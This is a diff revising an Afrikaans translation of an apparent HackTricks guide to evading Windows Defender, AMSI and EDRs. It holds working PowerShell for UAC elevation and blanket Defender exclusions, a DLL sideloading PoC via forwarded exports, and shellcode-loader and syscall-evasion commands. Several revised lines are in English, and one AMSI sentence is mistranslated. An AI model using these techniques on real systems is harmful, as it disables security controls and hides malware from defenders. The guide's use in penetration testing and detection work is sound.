@@ -6,130 +6,130 @@
 
 ## Stop Defender
 
-- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender te laat ophou werk.
-- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender te laat ophou werk deur ’n ander AV na te boots.
-- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)
+- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender se werking te stop.
+- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender se werking te stop deur ’n ander AV voor te gee.
+- [Skakel Defender uit as jy admin is](basic-powershell-for-pentesters/README.md)
 
-### Installer-styl UAC-lokmiddel voordat daar aan Defender geknoei word
+### Installeerder-agtige UAC lokaas voordat jy met Defender knoei
 
-Openbare loaders wat as game cheats vermom is, word dikwels as ongetekende Node.js/Nexe-installeerders versprei wat eers die gebruiker om elevation vra en eers daarna Defender uitskakel. Die proses is eenvoudig:
+Openbare loaders wat as game cheats voorgee, word dikwels afgelewer as ongetekende Node.js/Nexe installers wat eers die gebruiker om elevation vra en eers daarna Defender neutraliseer. Die proses is eenvoudig:
 
-1. Toets vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die aanroeper admin rights het, dus dui ’n mislukking daarop dat die loader as ’n standaard gebruiker loop.
-2. Herbegin onmiddellik self met die `RunAs`-verb om die verwagte UAC toestemmingsprompt te aktiveer, terwyl die oorspronklike command line behou word.
+1. Ondersoek vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die aanroeper admin-regte het, so ’n mislukking dui daarop dat die loader as ’n standaard gebruiker hardloop.
+2. Herlanseer onmiddellik homself met die `RunAs` verb om die verwagte UAC consent prompt te veroorsaak terwyl die oorspronklike command line bewaar word.
 ```powershell
 if (-not (net session 2>$null)) {
 powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
 exit
 }
 ```
-Slagoffers glo reeds dat hulle “cracked” sagteware installeer, dus word die bevestigingsprompt gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.
+Slagoffers glo reeds dat hulle “cracked” sagteware installeer, so die prompt word gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.
 
-### Algemene `MpPreference` uitsonderings vir elke stasieletter
+### Algemene `MpPreference` uitsluitings vir elke skyfletter
 
-Sodra verhoogde regte verkry is, maksimeer GachiLoader-style chains die blinde kolle van Defender in plaas daarvan om die diens heeltemal uit te skakel. Die loader maak eers die GUI watchdog dood (`taskkill /F /IM SecHealthUI.exe`) en druk dan **uiters breë uitsonderings** sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:
+Sodra verhoogde regte verkry is, maksimeer GachiLoader-style chains Defender se blinde kolle, in plaas daarvan om die diens heeltemal uit te skakel. Die loader beëindig eers die GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) en druk dan **uiters breë uitsluitings** sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word:
 ```powershell
 $targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
 Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
 $targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
 Add-MpPreference -ExclusionExtension '.sys'
 ```
-Belangrike waarnemings:
+Key observations:
 
-- Die loop stap elke gemonteerde lêerstelsel deur (D:\, E:\, USB-stokkies, ens.) so **enige toekomstige payload wat eender waar op die skyf gedruppel word, word geïgnoreer**.
-- Die uitsluiting vir die `.sys`-uitbreiding is vorentoe-gerig—aanvallers hou die opsie oop om later ongetekende drivers te laad sonder om Defender weer aan te raak.
-- Alle veranderings beland onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wat later stadiums toelaat om te bevestig dat die uitsluitings voortbestaan of om dit uit te brei sonder om UAC weer te trigger.
+- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **enige toekomstige payload wat oral op die skyf neergesit word, word geïgnoreer**.
+- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
+- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.
 
-Omdat geen Defender-diens gestop word nie, rapporteer naïewe gesondheidstoetse steeds “antivirus active” al raak die real-time inspeksie daardie paaie nooit aan nie.
+Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.
 
-## **AV Evasion Methodology**
+## **AV Ontduikingsmetodologie**
 
-Op die oomblik gebruik AVs verskillende metodes om te bepaal of 'n lêer kwaadwillig is of nie: statiese deteksie, dinamiese analise, en vir die meer gevorderde EDRs, gedragsanalise.
+Tans gebruik AVs verskillende metodes om te bepaal of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese analise, en vir die meer gevorderde EDRs, gedragsanalise.
 
-### **Statiese deteksie**
+### **Statiese opsporing**
 
-Statiese deteksie word bereik deur bekende kwaadwillige stringe of bytes in 'n binêre of skrip te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat betrap, aangesien hulle waarskynlik al ontleed en as kwaadwillig gevlag is. Daar is 'n paar maniere om hierdie soort deteksie te omseil:
+Statiese opsporing word bereik deur bekende kwaadwillige strings of byt-reekse in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan vang, aangesien hulle waarskynlik al geanaliseer en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie tipe opsporing te omseil:
 
 - **Encryption**
 
-As jy die binêre enkripteer, sal daar geen manier wees vir AV om jou program te vind nie, maar jy sal 'n soort loader nodig hê om die program in geheue te ontsleutel en te laat loop.
+As jy die binary enkripteer, sal AV geen manier hê om jou program te detecteer nie, maar jy sal ’n soort loader nodig hê om dit te dekripteer en die program in geheue te laat loop.
 
 - **Obfuscation**
 
-Soms hoef jy net sommige stringe in jou binêre of skrip te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees afhangende van wat jy probeer obfuskeer.
+Soms hoef jy net ’n paar strings in jou binary of script te verander om dit deur AV te kry, maar dit kan tydrowend wees, afhangend van wat jy probeer obfuskeer.
 
 - **Custom tooling**
 
-As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.
+As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.
 
 > [!TIP]
 > A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.
 
-Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion nagaan.
+Ek beveel sterk aan dat jy hierdie YouTube playlist oor praktiese AV Evasion aanskou: https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf
 
 ### **Dinamiese analise**
 
-Dinamiese analise is wanneer die AV jou binêre in 'n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou browser se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan bietjie moeiliker wees om mee te werk, maar hier is 'n paar dingetjies wat jy kan doen om sandbokse te omseil.
+Dinamiese analise is wanneer die AV jou binary in ’n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaier se wagwoorde te dekripteer en te lees, ’n minidump op LSASS uit te voer, ens.). Hierdie deel kan ’n bietjie moelik wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te omseil.
 
-- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n uitstekende manier wees om AV se dinamiese analise te omseil. AV's het baie min tyd om lêers te skandeer sodat die gebruiker se werkvloei nie onderbreek word nie, so die gebruik van lang sleeps kan die analise van binêre ontwrig. Die probleem is dat baie AV-sandbokse die sleep net kan oor slaan afhangend van hoe dit geïmplementeer is.
-- **Checking machine's resources** Gewoonlik het sandbokse baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien kon vertraag. Jy kan hier ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaierpunte te kontroleer; nie alles sal in die sandbox geïmplementeer wees nie.
-- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se werkstasie aan die "contoso.local" domein gekoppel is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program uitstap.
+- **Wag voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n uitstekende manier wees om AV se dinamiese analise te omseil. AV’s het baie min tyd om lêers te scan om die gebruiker se werkvloei nie te onderbreek nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV-sandboxes die sleep eenvoudig kan oorslaan, afhangend van die implementering.
+- **Kontroleer die masjien se bronne** Gewoonlik het sandboxes baie min hulpbronne tot hul beskikking (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien vertraag. Jy kan hier baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaier-snelhede te kontroleer — nie alles word in die sandbox geïmplementeer nie.
+- **Masjien-spesifieke kontroles** As jy ’n spesifieke gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program eenvoudig afsluit.
 
-Dit blyk dat Microsoft Defender se Sandbox rekenaarnaam HAL9TH is, so jy kan vir die rekenaarnaam in jou malware kyk voor detonasie; as die naam HAL9TH ooreenstem, beteken dit jy is binne defender se sandbox, en dan kan jou program uitstap.
+Dit blyk dat Microsoft Defender se Sandbox rekenaarnáám HAL9TH is, so jy kan vir daardie rekenaarnáám in jou malware kyk voor detonering — as die naam HAL9TH is, beteken dit jy is binne Defender se sandbox, en jy kan jou program laat afsluit.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Nog 'n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die benadering van Sandboxes
+Sommige ander goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die hantering van Sandboxes
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>
 
-Soos ons vroeër in hierdie pos gesê het, sal **public tools** uiteindelik **gedetekteer word**, so jy moet jouself iets vra:
+Soos ons vroeër in hierdie stuk gesê het, **public tools** sal uiteindelik **gedetecteer word**, dus moet jy jouself ’n vraag vra:
 
-Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander, minder bekende projek gebruik wat ook LSASS dump?
+Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?
 
-Die regte antwoord is waarskynlik die laaste. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van, indien nie die mees gevlagte stukkie malware deur AVs en EDRs nie; alhoewel die projek self baie gaaf is, is dit ook 'n nagmerrie om daarmee te werk om rondom AVs te kom, so kyk net vir alternatiewe vir wat jy probeer bereik.
+Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as voorbeeld: dit is waarskynlik een van die, indien nie die mees, gemerkte stukke malware deur AVs en EDRs; al is die projek self baie cool, dit is ook ’n nagmerrie om daarmee te werk om AV’s te omseil, so soek eerder alternatiewe vir wat jy probeer bereik.
 
 > [!TIP]
-> Wanneer jy jou payloads wysig vir ontduiking, maak seker dat jy **automatic sample submission** in defender uitskakel, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel langtermyn ontduiking is. As jy wil kyk of jou payload deur 'n bepaalde AV gedetekteer word, installeer dit op 'n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.
+> Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese sample submission afskakel** in Defender, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel op die lang duur ontduiking is. As jy wil nagaan of jou payload deur ’n bepaalde AV gedetecteer word, installeer dit op ’n VM, probeer om die outomatiese sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.
 
 ## EXEs vs DLLs
 
-Wanneer dit moontlik is, **prioritiseer altyd die gebruik van DLLs vir ontduiking**; volgens my ervaring word DLL-lêers gewoonlik **veel minder gedetekteer** en ontleed, so dit is 'n baie eenvoudige truuk om in sommige gevalle deteksie te vermy (as jou payload natuurlik op een of ander manier as 'n DLL kan loop).
+Wanneer dit moontlik is, prioritiseer altyd die gebruik van DLLs vir ontduiking; uit my ervaring word DLL-lêers gewoonlik baie minder gedetecteer en ontleed, so dit is ’n eenvoudige truuk om in sekere gevalle deteksie te vermy (as jou payload natuurlik op een of ander manier as ’n DLL kan loop).
 
-Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n deteksietempo van 4/26 op antiscan.me, terwyl die EXE-payload 'n 7/26 deteksietempo het.
+Soos ons in hierdie beeld kan sien, het ’n DLL Payload van Havoc ’n detectiekoers van 4/26 in antiscan.me, terwyl die EXE payload ’n detectiekoers van 7/26 het.
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van ’n normale Havoc EXE payload vs ’n normale Havoc DLL</p></figcaption></figure>
 
-Nou wys ons 'n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stil te wees.
+Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stil te wees.
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** maak gebruik van die DLL-soekorde wat deur die loader gebruik word deur beide die slagofferprogram en kwaadwillige payload(s) langs mekaar te posisioneer.
+**DLL Sideloading** maak voordeel van die DLL search order wat deur die loader gebruik word deur beide die slagoffer-toepassing en kwaadwillige payload(s) langs mekaar te plaas.
 
-Jy kan programme kontroleer wat vatbaar is vir DLL Sideloading deur [Siofra](https://github.com/Cybereason/siofra) te gebruik en die volgende powershell-skrip:
+Jy kan programme wat vatbaar is vir DLL Sideloading nagaan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
 ```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
-Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL files wat hulle probeer laai, uitset.
+Hierdie kommando sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitvoer.
 
-Ek beveel sterk aan dat jy **verken DLL Hijackable/Sideloadable programs self**, hierdie tegniek is redelik onopvallend as dit behoorlik gedoen word, maar as jy publicly known DLL Sideloadable programs gebruik, kan jy maklik vasgevang word.
+Ek beveel sterk aan dat jy **explore DLL Hijackable/Sideloadable programs yourself**; hierdie tegniek is baie stealthy as dit behoorlik gedoen word, maar as jy openlik bekende DLL Sideloadable programs gebruik, kan jy maklik betrap word.
 
-Net deur 'n malicious DLL met die naam wat 'n program verwag om te laai te plaas, sal nie jou payload laai nie, aangesien die program spesifieke funksies binne daardie DLL verwag. Om hierdie probleem reg te stel, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.
+Net deur 'n slegwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal nie noodwendig jou payload laai nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag; om hierdie probleem reg te stel, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.
 
-**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en malicious) DLL na die oorspronklike DLL, en behou sodoende die program se funksionaliteit en maak dit moontlik om die uitvoering van jou payload te hanteer.
+**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en slegwillige) DLL na die oorspronklike DLL, en behou dus die program se funksionaliteit terwyl dit die uitvoering van jou payload kan hanteer.
 
 Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.
 
-Dit is die stappe wat ek gevolg het:
+Hier is die stappe wat ek gevolg het:
 ```
 1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
 2. Generate some shellcode (I used Havoc C2)
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.
+Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
@@ -139,38 +139,38 @@ Dit is die resultate:
 
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Beide ons shellcode (geenkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 opsporingsyfer by [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.
+Beide ons shellcode (gekodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 deteksiekoers by [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Ek beveel sterk aan dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer diepgaande te leer oor wat ons bespreek het.
+> Ek beveel **uiters aan** dat jy kyk na [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons meer in-diepte bespreek het.
 
 ### Misbruik van Forwarded Exports (ForwardSideLoading)
 
-Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export-inskrywing 'n ASCII-string van die vorm `TargetDll.TargetFunc`. Wanneer 'n oproeper die export oplos, sal die Windows-loader:
+Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan dat dit na kode verwys, bevat die export-invoer 'n ASCII-tekenreeks van die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export oplos, sal die Windows-loader:
 
-- Laai `TargetDll` indien dit nie reeds gelaai is nie
-- Los `TargetFunc` daaruit op
+- Laai `TargetDll` as dit nog nie gelaai is nie
+- Los `TargetFunc` daarvan op
 
 Belangrike gedrag om te verstaan:
-- As `TargetDll` 'n KnownDLL is, word dit gelewer vanaf die beskermde KnownDLLs namespace (bv., ntdll, kernelbase, ole32).
-- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.
+- As `TargetDll` 'n KnownDLL is, word dit verskaf vanaf die beskermde KnownDLLs-naamruimte (bv. ntdll, kernelbase, ole32).
+- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids van die module wat die forward-resolusie doen insluit.
 
-Dit maak 'n indirekte sideloading-primitive moontlik: vind 'n ondertekende DLL wat 'n funksie exporteer wat na 'n nie-KnownDLL module-naam doorgestuur is, en plaas daardie ondertekende DLL saam met 'n aanvaller-beheerde DLL met presies dieselfde naam as die forwarded target module. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, wat jou DllMain uitvoer.
+Dit skep 'n indirekte sideloading-primitive: vind 'n signed DLL wat 'n funksie eksporteer wat forwarded is na 'n nie-KnownDLL modulenaam, plaas daardie signed DLL dan in dieselfde gids as 'n attacker-controlled DLL wat presies dieselfde naam het as die forwarded teikenmodule. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, en voer jou DllMain uit.
 
 Voorbeeld waargeneem op Windows 11:
 ```
 keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
 ```
-`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit opgelos deur die normale soekorde.
+`NCRYPTPROV.dll` is nie 'n KnownDLL nie, so dit word via die normale soekorde opgelos.
 
 PoC (copy-paste):
-1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare map
+1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare gids
 ```
 copy C:\Windows\System32\keyiso.dll C:\test\
 ```
-2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die voorgestuurde funksie te implementeer om DllMain te aktiveer nie.
+2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die doorgestuurde funksie te implementeer om DllMain te aktiveer nie.
 ```c
 // x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
 #include <windows.h>
@@ -182,35 +182,35 @@ if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&
 return TRUE;
 }
 ```
-3) Aktiveer die doorstuur met 'n ondertekende LOLBin:
+3) Aktiveer die forward met 'n ondertekende LOLBin:
 ```
 rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
 ```
 Observed behavior:
-- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
-- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die laaier die deurverwysing na `NCRYPTPROV.SetAuditingInterface`
-- Die laaier laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
-- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout ná `DllMain` reeds uitgevoer is
+- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
+- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
+- Die loader laai dan `NCRYPTPROV.dll` van `C:\test` en voer sy `DllMain` uit
+- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout nadat `DllMain` reeds geloop het
 
 Hunting tips:
-- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
-- Jy kan forwarded exports uitken met gereedskap soos:
+- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs is gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
+- Jy kan forwarded exports opnoem met gereedskap soos:
 ```
 dumpbin /exports C:\Windows\System32\keyiso.dll
 # forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
 ```
-- Sien die Windows 11 forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt
+- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt
 
-Opsporing/verdedigingsidees:
-- Hou dop vir LOLBins (bv. rundll32.exe) wat gesigneerde DLLs uit nie-stelselspaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basenaam uit daardie gids
-- Waarsku by proses/module-kettings soos: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikerskryfbare paaie
-- Dwing code-integriteitsbeleid af (WDAC/AppLocker) en weier skryf+uitvoer in toepassingsgidse
+Opsporing-/verdedigingsidees:
+- Monitor LOLBins (e.g., rundll32.exe) wat gesigneerde DLLs vanaf nie-stelselpaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basenaam uit daardie gids
+- Waarsku op proses-/module-kettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paaie
+- Handhaaf code-integriteitsbeleid (WDAC/AppLocker) en weier write+execute in toepassingsgidse
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
 `Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
 
-Jy kan Freeze gebruik om jou shellcode op 'n heimlike wyse te laai en uit te voer.
+Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -220,13 +220,39 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> Ontduiking is net 'n kat-en-muis spel; wat vandag werk kan môre opgespoor word, so vertrou nooit net op een hulpmiddel nie—indien moontlik, probeer om verskeie evasion-tegnieke te koppel.
+> Evasie is net 'n kat-en-muis-speletjie; wat vandag werk, kan môre opgespoor word, so moenie op net een tool staatmaak nie — indien moontlik, probeer om verskeie evasion techniques aan mekaar te koppel.
 
+## Direk/Indirek Syscalls & SSN-opsporing (SysWhispers4)
+
+EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` syscall stubs. Om daardie hooks te omseil, kan jy **direct** of **indirect** syscall stubs genereer wat die korrekte **SSN** (Sisteemdiensnommer) laai en na kernel-modus oorgaan sonder om die gehookte export entrypoint uit te voer.
+
+**Invocation options:**
+- **Direct (embedded)**: skryf 'n `syscall`/`sysenter`/`SVC #0` instruksie in die gegenereerde stub (geen `ntdll` export hit nie).
+- **Indirect**: spring in 'n bestaande `syscall` gadget binne `ntdll` sodat die kernel-oorgang lyk of dit vanaf `ntdll` afkomstig is (nuttig vir heuristic evasion); **randomized indirect** kies 'n gadget uit 'n pool per oproep.
+- **Egg-hunt**: vermy om die statiese `0F 05` opcode-sekwensie op skyf in te sluit; los 'n syscall-sekwensie op tydens runtime.
+
+**SSN-opsporingsstrategieë wat weerstand bied teen hooks:**
+- **FreshyCalls (VA sort)**: leid SSNs af deur syscall stubs volgens virtuele adres te sorteer in plaas daarvan om stub-bytes te lees.
+- **SyscallsFromDisk**: map 'n skoon `\KnownDlls\ntdll.dll`, lees SSNs uit sy `.text`, en unmap dan (omseil alle in-memory hooks).
+- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opcode-validatie wanneer 'n stub skoon is; val terug op VA-afleiding as dit gehook is.
+- **HW Breakpoint**: stel DR0 op die `syscall` instruksie en gebruik 'n VEH om die SSN vanaf `EAX` tydens runtime te vang, sonder om gehookte bytes te ontleed.
+
+Voorbeeldgebruik van SysWhispers4:
+```bash
+# Indirect syscalls + hook-resistant resolution
+python syswhispers.py --preset injection --method indirect --resolve recycled
+
+# Resolve SSNs from a clean on-disk ntdll
+python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll
+
+# Hardware breakpoint SSN extraction
+python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
+```
 ## AMSI (Anti-Malware Scan Interface)
 
-AMSI was geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **files on disk** skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.
+AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **files on disk** skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks daaraan doen nie, aangesien dit nie genoeg sigbaarheid gehad het nie.
 
-The AMSI feature is integrated into these components of Windows.
+Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.
 
 - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
 - PowerShell (scripts, interactive use, and dynamic code evaluation)
@@ -234,37 +260,37 @@ The AMSI feature is integrated into these components of Windows.
 - JavaScript and VBScript
 - Office VBA macros
 
-Dit stel antivirusoplossings in staat om skripgedrag te inspekteer deur skripinhoud bloot te stel in 'n vorm wat beide unencrypted en unobfuscated is.
+Dit laat antivirus-oplossings toe om scriptgedrag te inspekteer deur scriptinhoud bloot te lê in 'n vorm wat beide ongeskryf/encrypted en unobfuscated is.
 
